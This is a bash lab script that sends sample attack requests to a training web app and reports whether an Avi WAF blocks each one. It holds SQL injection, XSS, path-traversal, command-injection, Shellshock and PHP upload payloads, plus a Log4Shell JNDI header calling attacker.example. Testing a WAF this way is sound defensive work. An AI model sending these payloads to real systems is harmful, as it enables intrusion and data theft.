#!/bin/bash
# waf-demo.sh - send a set of classic malicious-looking requests to the lab web app
# and report for each one whether it was ALLOWED or BLOCKED by the Avi WAF.
#
# Lab use only: run it against the training app (web-front3) of your own org.
#
# Usage:  ./waf-demo.sh <hostname>   (or export WAF_DEMO_HOST=<hostname>)
# Only needs bash + curl, so it runs as is from the student desktop.
#   hostname defaults to gw-v3.<org>-gitops.<domain> if passed as $1, e.g.
#   ./waf-demo.sh gw-v3.org-1-gitops.vcf9.lab
#
# Expected results:
#   v1 (no WAF)            -> every request ALLOWED, nothing in Avi security analytics
#   v2 (WAF detection)     -> every request ALLOWED, but flagged in Avi (Security / WAF logs)
#   v3 (WAF enforcement)   -> attacks BLOCKED (403 or connection reset), baseline ALLOWED

host="${1:-${WAF_DEMO_HOST:-}}"
if [ -z "${host}" ]; then
  echo "Usage: $0 <hostname>   e.g. $0 gw-v3.org-1-gitops.vcf9.lab" >&2
  exit 1
fi
base="https://${host}"

if [ -t 1 ]; then
  green=$'\033[32m'; red=$'\033[31m'; yellow=$'\033[33m'; off=$'\033[0m'
else
  green=""; red=""; yellow=""; off=""
fi
allowed=0; blocked=0

# name | method | path (already URL-encoded) | extra curl args
send() {
  local name="$1" method="$2" path="$3"; shift 3
  local code
  code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 10 -X "${method}" "$@" "${base}${path}")
  local rc=$?
  if [ "${code}" = "403" ] || [ "${code}" = "000" ] || [ ${rc} -eq 56 ] || [ ${rc} -eq 52 ]; then
    printf '%s[BLOCKED]%s %-34s HTTP %s\n' "${red}" "${off}" "${name}" "${code}"
    blocked=$((blocked+1))
  else
    printf '%s[ALLOWED]%s %-34s HTTP %s\n' "${green}" "${off}" "${name}" "${code}"
    allowed=$((allowed+1))
  fi
}

echo "Target: ${base}"
echo "-------------------------------------------------------------"

echo "${yellow}# Baseline (legitimate request, must always be allowed)${off}"
base_code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 10 "${base}/")
if [ "${base_code}" = "000" ] || [ "${base_code}" = "403" ] || [ "${base_code}" -ge 500 ]; then
  echo "Baseline request failed (HTTP ${base_code}): host unreachable, DNS/route not ready or app down. Aborting." >&2
  exit 2
fi
send "Legitimate GET /"                GET  "/"

echo "${yellow}# SQL injection${off}"
send "SQLi: tautology in query"        GET  "/?id=1%27%20OR%20%271%27%3D%271"
send "SQLi: UNION SELECT"              GET  "/?id=1%20UNION%20SELECT%20username,password%20FROM%20users--"
send "SQLi: DROP TABLE"                GET  "/?q=%27%3B%20DROP%20TABLE%20users%3B--"
send "SQLi: blind sleep()"             GET  "/?id=1%20AND%20SLEEP(5)--"
send "SQLi: in POST body"              POST "/login" -d "user=admin' OR '1'='1'--&pass=x"

echo "${yellow}# Cross-site scripting (XSS)${off}"
send "XSS: <script> tag"               GET  "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
send "XSS: img onerror"                GET  "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
send "XSS: javascript: URI"            GET  "/?url=javascript:alert(document.cookie)"
send "XSS: svg onload"                 GET  "/?q=%3Csvg%20onload%3Dalert(1)%3E"

echo "${yellow}# Path traversal / local file inclusion${off}"
send "Traversal: ../../etc/passwd"     GET  "/?file=../../../../etc/passwd"
send "Traversal: encoded"              GET  "/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
send "LFI: /etc/shadow"                GET  "/?page=/etc/shadow"

echo "${yellow}# Command injection / RCE${off}"
send "CmdInj: ; cat /etc/passwd"       GET  "/?host=127.0.0.1%3B%20cat%20%2Fetc%2Fpasswd"
send "CmdInj: \$(whoami)"              GET  "/?host=%24(whoami)"
send "Log4Shell: JNDI lookup header"   GET  "/" -H 'User-Agent: ${jndi:ldap://attacker.example/a}'
send "Shellshock header"               GET  "/" -H 'User-Agent: () { :; }; /bin/cat /etc/passwd'

echo "${yellow}# PHP2Shell (CVE-2026-109618/109619, Broadcom KB 460068) indicators${off}"
echo "${yellow}#   only meaningful against the php2shell demo app (php:8.3.35-apache) - the other${off}"
echo "${yellow}#   checks above still apply regardless of which app is behind this host${off}"
# curl's -F can't open a process-substitution path (/dev/fd/N) as upload
# content - confirmed fails with "Failed to open/read local data" - so this
# needs a real temp file, just to hold throwaway upload bytes.
php2shell_upload_body=$(mktemp)
echo test > "${php2shell_upload_body}"
send "PHP2Shell: PHPSESSID as POST form field"      POST "/" -d "PHPSESSID=injected"
send "PHP2Shell: malformed PHP_SESSION_UPLOAD_PROGRESS" POST "/" -d 'PHP_SESSION_UPLOAD_PROGRESS=$(id)'
send "PHP2Shell: PHP tag in upload filename"        POST "/" -F "file=@${php2shell_upload_body};filename=shell<?php.jpg"
send "PHP2Shell: serialized object in upload filename" POST "/" -F "file=@${php2shell_upload_body};filename=O:8:\"stdClass\":0:{}.jpg"
rm -f "${php2shell_upload_body}"

# Disabled: scanner user-agents and probes are not reliably blocked by the WAF policy. Uncomment to re-enable.
# echo "${yellow}# Scanners / protocol abuse${off}"
# send "Scanner user-agent (sqlmap)"     GET  "/" -H 'User-Agent: sqlmap/1.7'
# send "Scanner user-agent (nikto)"      GET  "/" -H 'User-Agent: Nikto/2.5.0'
# send "Probe: /.env"                    GET  "/.env"
# send "Probe: /wp-admin/install.php"    GET  "/wp-admin/install.php"

echo "-------------------------------------------------------------"
printf 'Summary: %s%d allowed%s, %s%d blocked%s\n' "${green}" "${allowed}" "${off}" "${red}" "${blocked}" "${off}"
echo "Now look in the Avi UI: Applications > Virtual Services > <your VS> > Security / Logs (WAF)."
